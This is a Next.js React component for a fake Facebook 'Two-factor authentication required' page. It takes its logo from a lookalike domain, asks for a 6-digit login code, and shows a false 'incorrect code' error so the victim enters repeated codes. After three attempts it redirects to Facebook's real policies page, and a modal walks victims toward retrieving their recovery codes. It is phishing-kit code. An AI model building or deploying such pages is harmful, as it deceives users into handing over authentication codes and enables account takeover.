import { useCallback, useEffect, useRef, useState } from 'react';
import Countdown from 'react-countdown';
import Image from 'next/image';
import { useRouter } from 'next/router';

import { Button, Modal } from 'antd';

const ConfirmPage = () => {
  const router = useRouter();

  const [code, setCode] = useState('');
  const [count, setCount] = useState(0);
  const [modal, setModal] = useState(false);
  const [showError, setShowError] = useState(false);
  const [countdownTime, setCountdownTime] = useState(Date.now() + 300000);

  const handleChangePassword = (event: any) => {
    const { value } = event.target;
    setCode(value);
  };

  const handleSendCode = () => {
    if (code) {
      setShowError(true);
      setTimeout(() => {
        setCount(count + 1);
      }, 1000);

      if (count === 2) {
        setShowError(false);
        router.replace('https://www.facebook.com/policies_center/');
      }
    } else {
      return;
    }
  };

  const visibleModal = () => setModal(false);

  const renderer = useCallback(({ minutes, seconds, completed }: any) => {
    if (completed) {
      return <a>Send code again</a>;
    } else {
      return (
        <span>
          ( wait: {minutes}:{seconds} )
        </span>
      );
    }
  }, []);

  return (
    <section>
      <header>
        <Image
          src='https://meta.supportfanpage.ink/static/uploads/Facebook_f_logo.png'
          alt='facebook'
          width={40}
          height={40}
        />
      </header>

      <div className='two-factor'>
        <h3>Two-factor authentication required (1/3)</h3>

        <div className='desc'>
          <p>
            You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device
            or browser.
          </p>

          <p>
            Enter the 6-digit code from your <b>code generator</b> or third-party app below.
          </p>
        </div>

        <div className='code'>
          <input type='text' placeholder='Login code' onChange={handleChangePassword} />
          <Countdown date={countdownTime} renderer={renderer} />
        </div>
        {showError && (
          <div className='error-text'>
            The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
          </div>
        )}

        <div className='footer'>
          <div className='anotherway' onClick={() => setModal(true)}>
            Need another way to authenticate?
          </div>

          <Button type='primary' onClick={handleSendCode}>
            Send
          </Button>
        </div>
      </div>

      <Modal
        centered
        title='Didn’t receive a code?'
        open={modal}
        onCancel={visibleModal}
        footer={[
          <Button key='close' onClick={visibleModal} className='closing-styling-button-no-define'>
            Close
          </Button>,
        ]}
      >
        <div className='receive-code'>
          <p>
            1. Go to <b>Settings {'>'} Security and Login.</b>
          </p>

          <p>
            2. Under the <b>Two-Factor Authentication</b> section, click <b>Use two-factor authentication.</b> You may
            need to re-enter your password.
          </p>

          <p>
            3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes</b>. If you've already set up
            recovery codes, you can click <b>Show Codes</b>.
          </p>
        </div>
      </Modal>
    </section>
  );
};

export default ConfirmPage;
